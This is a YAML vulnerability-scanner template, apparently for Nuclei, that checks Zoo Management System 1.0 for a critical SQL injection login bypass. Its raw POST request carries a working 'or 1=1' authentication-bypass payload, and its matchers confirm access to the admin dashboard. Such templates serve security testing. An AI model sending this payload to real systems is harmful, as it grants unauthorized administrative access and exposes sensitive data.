id: zms-auth-bypass
info:
  name: Zoo Management System 1.0 - SQL Injection
  author: dwisiswant0
  severity: critical
  description: The vulnerability in Zoo Management System 1.0 could allow an attacker
    to access and manipulate sensitive data in the system.
  reference:
  - https://www.exploit-db.com/exploits/48880
  - https://packetstormsecurity.com/files/159567/Zoo-Management-System-1.0-SQL-Injection.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  tags: edb,auth-bypass,packetstorm,zms
  metadata:
    impact: The SQL injection vulnerability in Zoo Management System 1.0 has the potential
      to allow attackers to access sensitive data, modify information, and carry out
      unauthorized administrative activities that could significantly impact the security
      of the affected site.
    recommendation: It is strongly recommended to update to a patched version of Zoo
      Management System 1.0 to avoid possible SQL injection attacks and unauthorized
      administrative operations.
requests:
- raw:
  - 'POST /zms/admin/index.php HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

    Content-Type: application/x-www-form-urlencoded

    Origin: {{BaseURL}}

    Referer: {{BaseURL}}/zms/admin/index.php

    Cookie: PHPSESSID={{randstr}}


    username=dw1%27+or+1%3D1+%23&password=dw1%27+or+1%3D1+%23&login=

    '
  host-redirects: true
  max-redirects: 1
  matchers-condition: and
  matchers:
  - type: regex
    regex:
    - Zoo Management System (\|\| Dashboard|@ 2020\. All right reserved)
    - ZMS ADMIN
    condition: and
    part: body
  - type: status
    status:
    - 200
